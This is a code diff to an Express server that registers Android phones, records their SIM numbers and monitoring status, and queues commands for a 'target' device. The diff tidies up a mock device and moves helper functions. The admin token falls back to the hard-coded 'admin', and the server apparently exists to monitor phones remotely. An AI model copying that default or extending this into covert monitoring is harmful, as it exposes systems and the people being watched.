@@ -7,7 +7,25 @@ app.use(express.json());
 
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin';
 
-// Store registered devices: { [deviceId]: { name, model, androidVersion, lastSeen, simNumbers, isDndOn, isMonitoring, connectedAt } }\nconst registeredDevices = {;\n\n// Mock test device for demonstration purposes\nregisteredDevices['test_device_001'] = {\n  id: 'test_device_001',\n  name: 'Test Device (Mock)',\n  model: 'Test Phone',\n  androidVersion: '12',\n  simNumbers: '0000000000',\n  lastSeen: new Date().toISOString(),\n  connectedAt: new Date().toISOString(),\n  isDndOn: false,\n  isMonitoring: true,\n  online: true\n};\n\n// Store pending commands per device: { [deviceId]: [{ type, payload, timestamp }] }\nconst queuedCommands = {};\n
+// Store registered devices: { [deviceId]: { name, model, androidVersion, lastSeen, simNumbers, isDndOn, isMonitoring, connectedAt } }
+const registeredDevices = {
+  'test_device_001': {
+    id: 'test_device_001',
+    name: 'Test Device (Mock)',
+    model: 'Test Phone',
+    androidVersion: '12',
+    simNumbers: '0000000000',
+    lastSeen: new Date().toISOString(),
+    connectedAt: new Date().toISOString(),
+    isDndOn: false,
+    isMonitoring: true,
+    online: true
+  }
+};
+
+// Store pending commands per device: { [deviceId]: [{ type, payload, timestamp }] }
+const queuedCommands = {};
+
 // Generate a unique device ID
 function generateDeviceId() {
   return 'dev_' + crypto.randomBytes(4).toString('hex').toUpperCase();
@@ -82,25 +100,6 @@ app.post('/api/checkin/:deviceId', (req, res) => {
     isMonitoring: registeredDevices[deviceId]?.isMonitoring || true,
     online: true
   };
-  
-  // If this is the first device or no devices were registered, add a test device
-  if (Object.keys(registeredDevices).length <= 1) {
-    const testDeviceId = 'test_device_001';
-    if (!registeredDevices[testDeviceId]) {
-      registeredDevices[testDeviceId] = {
-        id: testDeviceId,
-        name: 'Test Device (Mock)',
-        model: 'Test Phone',
-        androidVersion: '12',
-        simNumbers: '0000000000',
-        lastSeen: new Date().toISOString(),
-        connectedAt: new Date().toISOString(),
-        isDndOn: false,
-        isMonitoring: true,
-        online: true
-      };
-    }
-  }
   
   Log(`📱 Device checked in: ${deviceId} (${name || 'Unknown'})`);
   
@@ -184,21 +183,6 @@ app.post('/api/target/:deviceId', (req, res) => {
   }
 });
 
-// Offline check (inline - no setInterval in serverless)
-function cleanupOfflineDevices() {
-  const now = Date.now();
-  for (const [deviceId, device] of Object.entries(registeredDevices)) {
-    const lastSeen = new Date(device.lastSeen).getTime();
-    if (now - lastSeen > 60000) { // 1 minute offline threshold
-      device.online = false;
-    }
-  }
-}
-
-function Log(message) {
-  console.log(`[${new Date().toISOString()}] ${message}`);
-}
-
 // Start server (only in local non-Vercel environment)
 if (!process.env.VERCEL && !process.env.AWS_LAMBDA_FUNCTION_NAME) {
   const PORT = process.env.PORT || 3000;
@@ -209,3 +193,7 @@ if (!process.env.VERCEL && !process.env.AWS_LAMBDA_FUNCTION_NAME) {
 }
 
 module.exports = app;
+
+function Log(message) {
+  console.log(`[${new Date().toISOString()}] ${message}`);
+}
